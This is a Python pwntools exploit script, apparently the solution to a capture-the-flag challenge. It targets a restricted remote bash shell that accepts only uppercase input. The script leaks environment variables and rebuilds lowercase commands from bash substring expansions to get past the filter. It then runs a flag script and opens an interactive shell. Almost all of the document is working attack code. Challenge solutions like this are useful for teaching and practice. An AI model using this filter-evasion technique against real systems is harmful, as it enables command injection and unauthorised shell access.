#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

host = args.HOST or 'ch.hackyeaster.com'
port = int(args.PORT or 2303)

def start(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io


def chars_at(var, pos, l=1):
    return f'${{{var}:{pos}:{l}}}'


def get_var(var):
    print(io.recvuntil(b'crashbash$ '))
    s = f'${{{var}}}'
    io.sendline(s.encode('ascii'))
    ret = io.recvuntil(b'\n')
    ret = ret.decode('ascii').split(': ')[2]
    log.info(ret)
    return ret


def get_char(chars, c):
    if c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ':
        return c
    for k,v in chars.items():
        if c in v:
            for j in range(len(v)):
                if v[j] == c:
                    return chars_at(k,j,1)
    log.error(f'character {c} not found in {chars}')
    return ''

def build_command(chars, target):
    return ''.join(get_char(chars, c) for c in target)

# we can only enter uppercase letters as commands, so 
# get some characters via SHELL variables.

io = start()

chars = {var: get_var(var) for var in ['PWD', 'TERM']}
log.info(f'{chars}')

# now try to run set
s = build_command(chars, 'set')
print(io.recvuntil(b'crashbash$ '))
log.info(s)
io.sendline(s.encode('ascii'))
ret = io.recvuntil(b'crashbash$ ').decode('ascii')
log.info(f'{ret}')
chars2 = {}
for l in ret.split('\n'):
    v = l.split('=')
    if v[0] == 'BASH_VERSION': # is surrounded by '
        chars2[v[0]] = v[1][1:-1]
    elif len(v) == 2: 
        chars2[v[0]] = v[1]

log.info(f'{chars2}')

flag = build_command(chars2, '/printflag.sh B4sh_br0TH3rs')
log.info(flag)
io.sendline(flag.encode('ascii'))
io.interactive()


